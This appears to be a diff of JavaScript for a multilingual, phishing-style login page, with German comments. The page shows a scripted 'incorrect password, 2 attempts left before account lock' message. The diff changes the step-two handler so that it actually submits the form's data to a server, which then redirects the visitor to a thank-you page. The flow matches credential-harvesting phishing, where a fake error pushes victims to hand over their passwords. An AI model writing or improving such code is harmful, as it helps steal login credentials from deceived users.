@@ -43,9 +43,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
   if (step2Button) {
     step2Button.addEventListener("click", function (e) {
-      e.preventDefault();
+      e.preventDefault(); // Verhindere erstmal das automatische Absenden
 
-      // Mehrsprachige Fehlermeldung
       const messages = {
         de: "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.",
         en: "Incorrect password. 2 attempts left before account lock.",
@@ -65,25 +64,13 @@ document.addEventListener("DOMContentLoaded", function () {
       } else {
         passwordError.style.display = "none";
 
-        const selectedLang = document.getElementById("language")?.value || "de";
-        let targetPage = "danke.html";
-
-        switch (selectedLang) {
-          case "en":
-            targetPage = "danke_eng.html";
-            break;
-          case "fr":
-            targetPage = "danke_fr.html";
-            break;
-          case "es":
-            targetPage = "danke_es.html";
-            break;
-        }
-
-        window.location.href = targetPage;
+        // ➡️ Hier das Formular wirklich absenden:
+        document.querySelector('form').submit();
+        // Der Server empfängt die Daten und schickt danach ein Redirect zu danke.html
       }
     });
   }
+
 
   const langSelect = document.getElementById("language");
   if (langSelect) {
